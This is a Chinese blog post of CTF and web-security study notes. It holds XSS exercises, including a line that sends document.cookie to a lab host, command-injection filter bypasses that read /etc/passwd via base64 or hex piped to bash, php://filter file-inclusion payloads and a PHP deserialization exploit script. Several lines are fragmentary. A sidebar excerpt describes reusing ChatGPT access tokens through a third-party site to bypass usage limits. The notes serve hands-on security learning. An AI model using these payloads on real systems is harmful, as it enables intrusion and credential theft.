+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1627165">使用docker快速搭建xssPlatform测试平台实践-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p><font style="color:rgb(24, 24, 24);">docker run –name mysqlserver -e MYSQL_ROOT_PASSWORD&#x3D;123 -d -i -p 3309:3306 mysql:5.6</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056342805-7b4d0def-271f-4093-a1ab-8a90210af2ea.png"></p>
+<p>本地没有镜像会自动下载</p>
+<p>docker ps 显示正在运行的容器 -a显示所有容器(包括不在运行的)</p>
+<p>docker stop name 停止运行一个容器 start开始运行</p>
+<p><strong>安装dbeaver</strong></p>
+<p>Version 1.8.0_202 of the JVM is not suitable for this product.Version:17 or greater</p>
+<p>is required.(java版本问题)</p>
+<p>sudo update-alternatives –list java 查看安装了什么版本</p>
+<p>sudo update-alternatives –config java 切换版本</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056351046-85e276a3-40e0-47c2-a69e-d5e76ea89253.png"></p>
+<p>执行docker run –name xssPlatform_test –link mysqlserver:db -d -i -p 8888:80 daxia&#x2F;websafe:latest</p>
+<p>报错error pulling image configuration: download failed after attempts&#x3D;6: dial tcp 118.184.78.78:443: connect: connection refused</p>
+<p>执行</p>
+<p>sudo systemctl daemon-reload</p>
+<p>sudo systemctl restart docker</p>
+<p><font style="color:rgb(24, 24, 24);">vim &#x2F;etc&#x2F;hosts</font></p>
+<p><font style="color:rgb(24, 24, 24);">127.0.0.1 xss.localhost</font></p>
+<p><font style="color:rgb(24, 24, 24);">docker exec xssPlatform_test zsh -c “php &#x2F;root&#x2F;start.php”</font></p>
+<p><font style="color:rgb(51, 51, 51);">此时再通过浏览器访问</font></p>
+<p><a target="_blank" rel="noopener" href="http://xss.localhost:8888/">http://xss.localhost:8888/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056360079-eb7290fd-a817-4866-b3b8-e80fd7252072.png"></p>
+<p><font style="color:rgb(204, 0, 0);">密码是123</font></p>
+<p><font style="color:rgb(204, 0, 0);">好像不可以用虚拟机搭建 外部无法访问到虚拟机</font></p>
+<p><strong>常用HTML标签</strong></p>
+<p> 创建包含另一个文档的内联框架</p>
+<p> 这个标签定义多行的文本输入控件</p>
+<p> 向网页中嵌入一副图像</p>
+<p> 这个标签用于定义客户端脚本，比如JavaScript 这个标签既可以包含脚本语句，也可以通过src属性指向外部的脚本文件。必须的type属性规定脚本的MIME类型 JavaScript 的常见应用是图像操作、表单验证及动态内容更新。</p>
+<p><strong><font style="color:rgb(51, 51, 51);">常用javascript方法</font></strong></p>
+<p>alert alert()方法用于显示带有一条指定消息和一个确认按钮的警告框</p>
+<p>window.location window.location对象用于获得当前页面的地址(URL) ,并把浏览器重定向到新的页面</p>
+<p>location.href 返回当前显示的文档的完整URL</p>
+<p>onload 一张页面或一幅图像完成加载</p>
+<p>onsubmit 确认按钮被点击</p>
+<p>onerror 在加载文档或图像时发生错误</p>
+<p><strong>反射型</strong></p>
+<p><strong>低安全级别</strong></p>
+<p>手动添加cookie-&gt;f12-&gt;应用(application)-&gt;左侧选择cookie-&gt;添加</p>
+<p><font style="color:rgb(77, 77, 77);">测试是否存在xss漏洞</font></p>
+<p>获取用户cookie</p>
+<p><strong>中安全级别</strong></p>
+<p>2.转义 待完善</p>
+<p>3.内嵌 <font style="color:rgb(77, 77, 77);">ript&gt;alert(‘xss’)</font></p>
+<p>4.替换 </p>
+<p><strong><font style="color:rgb(77, 77, 77);">高安全级别</font></strong></p>
+<p>[<a target="_blank" rel="noopener" href="http://127.0.0.1/phpinfo.php]">http://127.0.0.1/phpinfo.php]</a>(&lt;a)&gt;link</p>
+<p><strong>impossible级别</strong></p>
+<p><font style="color:rgb(77, 77, 77);">htmlspecialchars()函数过滤 –待解决</font></p>
+<p><font style="color:rgb(77, 77, 77);">在php中，htmlspecialchars()函数是使用来把一些预定义的字符转换为HTML实体，返回转换后的新字符串，原字符串不变。如果 string 包含无效的编码，则返回一个空的字符串，除非设置了 ENT_IGNORE 或者 ENT_SUBSTITUTE 标志；</font><strong><font style="color:rgb(243, 59, 69);">而 htmlspecialchars 则可以转转义 &lt;&gt; 这样就无法通过script标签攻击。同时又可以过滤掉双引号，单引号(需要另外加个参数)，阻止靠元素属性来触发事件执行脚本</font></strong></p>
+<p><strong><font style="color:rgb(0, 0, 0);">存储型</font></strong></p>
+<p>前端限制输入长度</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056369491-7c55c6f5-0308-4c99-a16e-a3d476780af2.png"></p>
+<p>修改maxlength即可</p>
+<p>window.open<font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">方法，这是Web API中的一个方法，用于在当前浏览器窗口中打开一个新的浏览器窗口或标签页。在这个特定的例子中，</font></p>
+<p>window.open<font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">被用来向指定的URL（</font><a target="_blank" rel="noopener" href="http://192.168.211.130/cookie.php">http://192.168.211.130/cookie.php</a><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">）发送一个HTTP GET请求，并尝试在新窗口或标签页中打开该URL</font></p>
+<p><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">在JavaScript中，</font></p>
+<p><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);"> 这段代码中的等号（</font></p>
+<p>&#x3D;<font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">）并不是位于引号内部，而是作为字符串连接操作的一部分，用于将</font></p>
+<p>document.cookie<font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">的值附加到字符串</font>‘<a target="_blank" rel="noopener" href="http://192.168.211.130/cookie.php?cookie=">http://192.168.211.130/cookie.php?cookie=</a>‘<font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">的末尾</font></p>
+<p><strong><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">待分类</font></strong></p>
+<p>SVN泄露</p>
+<p><font style="color:rgb(77, 77, 77);">dvcs-ripper：终端中输入</font></p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
+<p>rip-svn.pl -u <a target="_blank" rel="noopener" href="http://challenge-f1f96d75b106e047.sandbox.ctfhub.com:10080/.svn/">http://challenge-f1f96d75b106e047.sandbox.ctfhub.com:10080/.svn/</a>或</p>
+<p>.&#x2F;rip-svn.pl -u <a target="_blank" rel="noopener" href="http://challenge-f1f96d75b106e047.sandbox.ctfhub.com:10080/.svn/">http://challenge-f1f96d75b106e047.sandbox.ctfhub.com:10080/.svn/</a></p>
+<p>，先sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</p>
+<p>sudo apt-get install libparallel-forkmanager-perl libredis-perl libalgorithm-combinatorics-perl</p>
+<p>sudo apt-get install cvs subversion git bzr mercurial</p>
+<p>————————————————</p>
+<p>hg泄露</p>
+<p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">.&#x2F;rip-hg.pl -v -u URL&#x2F;.hg&#x2F;</font></p>
+<p>软连接</p>
+<p><font style="color:rgb(77, 77, 77);">软连接是</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020">linux</a><font style="color:rgb(77, 77, 77);">中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。软连接类似与c语言中的指针，传递的是文件的地址；更形象一些，软连接类似于WINDOWS系统中的快捷方式</font></p>
+<p>ln -s [源文件或目录] [目标文件或目录]</p>
+<p>口令登录非常简单，只需要一条命令，命令格式为： **ssh 客户端用户名@服务器ip地址  **eg:</p>
+<p>ssh <a href="mailto:&#x6c;&#x64;&#122;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x30;&#46;&#49;">&#x6c;&#x64;&#122;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x30;&#46;&#49;</a></p>
+<p><font style="color:rgb(77, 77, 77);">code&#x3D;printf(<code>l\s</code>);</font></p>
+<p><font style="color:rgb(77, 77, 77);"><code>echo &#39;Y2F0wqAK&#39; | base64 -d</code> &#x2F;etc&#x2F;passwd</font></p>
+<p>正则匹配绕过</p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">利用变量绕过</font></li>
+</ol>
+<p>a&#x3D;c;b&#x3D;a;c&#x3D;t;</p>
+<p>$a$b$c &#x2F;etc&#x2F;passwd</p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">利用base编码绕过</font></li>
+</ol>
+<p>echo ‘cat’ | base64</p>
+<p>Y2F0wqAK</p>
+<p>echo ‘Y2F0wqAK’ | base64 -d &#x2F;etc&#x2F;passwd</p>
+<p>echo ‘Y2F0IC9ldGMvcGFzc3dk’ | base64 -d | bash&#x2F;&#x2F; cat &#x2F;etc&#x2F;passwd</p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">利用hex编码（十六进制）绕过</font></li>
+</ol>
+<p>echo “636174202F6574632F706173737764” | xxd -r -p|bash&#x2F;&#x2F; hex编码后的0x不需要输入。</p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">利用oct编码（八进制）绕过</font></li>
+</ol>
+<p>$(printf “\154\163”)&#x2F;&#x2F;ls命令</p>
+<p>5)利用16进制编码绕过</p>
+<p>“\x73\x79\x73\x74\x65\x6d”(“cat &#x2F;etc&#x2F;passwd”);</p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">利用拼接绕过</font></li>
+</ol>
+<p>(sy.(st).em)(whoami);&#x2F;&#x2F;</p>
+<p>c’’a’’t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;单引</p>
+<p>c””a””t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;双引</p>
+<p>cat &#x2F;etc&#x2F;passwd&#x2F;反单引</p>
+<p>c\a\t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;反斜线</p>
+<p>————————————————</p>
+<p> 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 </p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957&#x2F;article&#x2F;details&#x2F;118855865</a></p>
+<p><strong>7) 利用未初始化变量，使用$u绕过</strong></p>
+<p>cat &#x2F;etc$u&#x2F;passwd</p>
+<p><strong>8）过滤了斜杠‘&#x2F;’</strong></p>
+<p>可利用’;’拼接命令绕过</p>
+<p>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</p>
+<p>system()</p>
+<p>passthru()</p>
+<p>exec()</p>
+<p>shell_exec()</p>
+<p>popen()</p>
+<p>proc_open()</p>
+<p>pcntl_exec()</p>
+<p>dirsearch怎么用</p>
+<p>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> -e php,html</p>
+<p><strong>HTTP</strong></p>
+<p><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">Referer头表示来源</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056381427-ac5a5fc5-7265-4e96-9706-f3b349407997.png"></p>
+<p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">User-Agent表示使用的浏览器，应该只要把Mozilla改了就行吧，不知道还没试</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056387823-a0537ac6-252b-404e-8d73-a5c658acc924.png"></p>
+<p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">X-Forwarded-For 表示ip地址与一下两个意义相同</font></p>
+<p>X-Real-IP: 1.2.3.4</p>
+<p>Client-IP: 1.2.3.4</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Light_shoot/article/details/133974913">https://blog.csdn.net/Light_shoot&#x2F;article&#x2F;details&#x2F;133974913</a></p>
+<p><strong>JavaScript</strong></p>
+<p>总结：<a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/11/12/misc/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ejavascript%E7%9A%84%E6%80%BB%E7%BB%93/">https://introspelliam.github.io/2017/11/12/misc/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ejavascript%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13546089.html#:~:text=%E8%AE%BE%E7%BD%AE%E4%B9%8B%E5%90%8E%EF%BC%8CFiref">CTF-WEB：BurpSuite 工具应用 - 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056407580-ffe7f6e5-e7fa-4161-8d2a-1a903063280d.png"></p>
+<p><img src="/.io//"></p>
+<p><img src="/.io//"></p>
+<p>ffifdyop<font style="color:rgb(34, 34, 34);"> 这个字符串被 md5 哈希了之后会变成 </font></p>
+<p>276f722736c95d99e921722cf9ed621c<font style="color:rgb(34, 34, 34);">，这个字符串前几位刚好是 ‘ </font></p>
+<p>or ‘6</p>
+<p><img src="/.io//"></p>
+<p>f12-网络</p>
+<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php [BJDCTF2020]ZJCTF，不过如此</p>
+<p>newstar ctf</p>
+<p>jwt json web token <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/113440680">CTFHub-Web进阶-JWT练习_ctfhub jwt-CSDN博客</a></p>
+<p>文件包含rot和base被过滤了，还有一个十六进制的可以用</p>
+<p>十六进制：</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php </p>
+<p>我先把base64的和Rot13的补充一下，以备下次使用</p>
+<p>base64：</p>
+<p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php </p>
+<p>Rot13：</p>
+<p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Fab1an/p/17766493.html">NewStarCTF 2023 公开赛道 Week2 - Fab1an - 博客园 (cnblogs.com)</a></p>
+<p><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">?file&#x3D;php:</font><font style="color:rgb(0, 128, 0);background-color:rgb(245, 245, 250);">&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</font></p>
+<p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</p>
+<p>newstarctf web week2 unserialize</p>
+<p>class evil {</p>
+<p>private $cmd;</p>
+<p>public function __construct($cmd) { $this-&gt;cmd &#x3D; $cmd; } public function __destruct() { if (!preg_match(“&#x2F;cat|tac|more|tail|base&#x2F;i”, $this-&gt;cmd)) { @system($this-&gt;cmd); } } </p>
+<p>}</p>
+<p>&#x2F;&#x2F; 构造Payload，传入要执行的命令</p>
+<p>$payload &#x3D; new evil(“your_command_here”);</p>
+<p>&#x2F;&#x2F; 序列化Payload</p>
+<p>$serialized_payload &#x3D; serialize($payload);</p>
+<p>&#x2F;&#x2F; 将Payload发送到目标网站</p>
+<p>$data &#x3D; [</p>
+<p>‘unser’ &#x3D;&gt; $serialized_payload,</p>
+<p>];</p>
+<p>$url &#x3D; ‘<a target="_blank" rel="noopener" href="http://target_website.com/">http://target_website.com</a>‘; &#x2F;&#x2F; 替换成目标网站的URL</p>
+<p>$options &#x3D; [</p>
+<p>‘http’ &#x3D;&gt; [</p>
+<p>‘method’ &#x3D;&gt; ‘POST’,</p>
+<p>‘header’ &#x3D;&gt; ‘Content-type: application&#x2F;x-www-form-urlencoded’,</p>
+<p>‘content’ &#x3D;&gt; http_build_query($data),</p>
+<p>],</p>
+<p>];</p>
+<p>$context &#x3D; stream_context_create($options);</p>
+<p>$response &#x3D; file_get_contents($url, false, $context);</p>
+<p>&#x2F;&#x2F; 输出响应</p>
+<p>echo $response;</p>
+<p>?&gt;</p>
+<p>sort排序输出，uniq去重输出</p>
+<p>python2 GitHack.py <a target="_blank" rel="noopener" href="http://106.75.72.168:9999/.git/">http://106.75.72.168:9999/.git/</a></p>
+<p>php混淆解密<a target="_blank" rel="noopener" href="http://www.zhaoyuanma.com/phpjm.html">php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解</a></p>
+<p><img src="/.io//"></p>
+<p>已经每个字节分好的话使用下面这种</p>
+<p><img src="/.io//"></p>
+<p><img src="/.io//"></p>
+<p>cmd &#x3D; (“\x73\x79\x73\x74\x65\x6d”)(“nl &#x2F;f*”);</p>
+<p>_tosting方法在访问不存在的属性的时候触发</p>
+<p><font style="color:rgb(33, 37, 41);">_invoke()，调用函数的方式调用一个对象时触发</font></p>
+<p><a target="_blank" rel="noopener" href="https://ns.openctf.net/wp/2024/">WriteUp - NewStar CTF 2024</a></p>
+<p><font style="color:rgb(235, 235, 235);background-color:rgb(27, 27, 31);">Yakit、VSCode REST Client 插件</font></p>
+<p><font style="color:rgb(33, 37, 41);">newstarctf week2 web 一秒八句英文 payload为什么是 payload &#x3D; {‘user_input’: value}</font></p>
+<p><font style="color:rgb(33, 37, 41);">post中的数据要这样写</font>star[]&#x3D;2&amp;cmd&#x3D;system(‘tac &#x2F;f*’);</p>
+<p>system中要’’单引号结尾要记得;&amp;只要加一个</p>
+<p>private分析：</p>
+<p>这样就发现本来是<font style="color:rgb(221, 17, 68);">age</font>结果上面出现的是<font style="color:rgb(221, 17, 68);">testage</font>，而且<font style="color:rgb(221, 17, 68);">testage</font>长度为<font style="color:rgb(221, 17, 68);">7</font>，但是上面显示的是<font style="color:rgb(221, 17, 68);">9</font></p>
+<p>查找资料后发现<strong>private属性序列化的时候格式是%00类名%00成员名</strong>，<font style="color:rgb(221, 17, 68);">%00</font>占一个字节长度，所以<font style="color:rgb(221, 17, 68);">age</font>加了类名后变成了<font style="color:rgb(221, 17, 68);">testage</font>长度为<font style="color:rgb(221, 17, 68);">9</font></p>
+<p>protect分析：</p>
+<p>本来是<font style="color:rgb(221, 17, 68);">sex</font>结果上面出现的是<font style="color:rgb(221, 17, 68);"><em>sex</em></font>，而且<font style="color:rgb(221, 17, 68);"><em>sex</em></font>的长度是<font style="color:rgb(221, 17, 68);">4</font>，但是上面显示的是<font style="color:rgb(221, 17, 68);">6</font>，同样查找资料后发现**protect属性序列化的时候格式是%00%00成员名*</p>
+<p><strong>冰蝎 java -jar behinder.jar</strong></p>
+<p>原型链污染指的是攻击者通过不当的操作，修改了对象的原型（</p>
+<p>prototype），通常是通过修改如 </p>
+<p>__proto__、</p>
+<p>constructor.prototype 或 </p>
+<p>Object.prototype 等关键属性</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://Bloodhound812.github.io">xhy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://bloodhound812.github.io/2024/11/08/WEB/">https://bloodhound812.github.io/2024/11/08/WEB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/11/06/free-ai/" title="free_ai"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">free_ai</div></div><div class="info-2"><div class="info-item-1">白嫖chatgpt4o中国手机号注册gmali再用该邮箱注册chatgpt即可(同学反馈的，我之前是不行) 注册成功后登录chatgpt然后在url后加上&#x2F;api&#x2F;auth&#x2F;session，如下图所示  回车后你会看到  在accessToken中吧双引号中间的内容复制一下，不要给别人看，就是我打码的这些 然后访问https://new.oaifree.com/auth/login  点击注册，然后继续，将复制的内容粘贴后即可不那啥也可以无限制的使用gpt4o，提示4o使用次数已用完刷新一下即可 </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xhy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/08/WEB/" title="Untitled">Untitled</a><time datetime="2024-11-08T09:01:00.755Z" title="Created 2024-11-08 17:01:00">2024-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/06/free-ai/" title="free_ai">free_ai</a><time datetime="2024-11-06T05:10:03.000Z" title="Created 2024-11-06 13:10:03">2024-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/05/hello-world/" title="Hello World">Hello World</a><time datetime="2024-11-05T11:51:19.138Z" title="Created 2024-11-05 19:51:19">2024-11-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By xhy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
